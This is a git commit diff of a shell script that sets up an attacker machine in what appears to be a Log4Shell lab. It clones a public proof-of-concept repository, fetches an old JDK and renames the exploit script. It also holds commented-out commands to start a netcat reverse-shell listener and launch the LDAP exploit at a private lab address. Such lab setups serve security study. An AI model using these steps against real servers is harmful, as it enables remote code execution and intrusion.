3e4ae673ec999bbf587796ea303b47147726a788
unknown <yongxian@lam.sg>
2022-04-24 20:19:17 +0800

    Update docker files

--- environment/attacker-config.sh
+++ environment/attacker-config.sh
@@ -8,14 +8,14 @@ git clone https://github.com/kozmer/log4j-shell-poc.git /home/vagrant/log4shell 
 # Copy files
 echo "[+]" $( date +%T ) "Copy POC Files"
 sudo curl --output /home/vagrant/log4shell/jdk-8u201-linux-x64.tar.gz https://repo.huaweicloud.com/java/jdk/8u201-b09/jdk-8u201-linux-x64.tar.gz
-sudo cp /vagrant/environment/poc2.py /home/vagrant/log4shell/
+sudo cp /vagrant/environment/poc-log4shell.py /home/vagrant/log4shell/
 cd /home/vagrant/log4shell && tar -xf jdk-8u201-linux-x64.tar.gz
 
 # Install Python 3 dependencies
-pip3 install -r requirements.txt
+cd /home/vagrant/log4shell && pip3 install -r requirements.txt
 
 # Run NetCat Listener
 #nc -lvnp 9001
 
 # Run Exploit LDAP
-#python3 poc2.py --userip localhost --webport 8000 --lport 9001
+#python3 poc-log4shell.py --userip 192.168.56.100 --webport 8000 --lport 9001
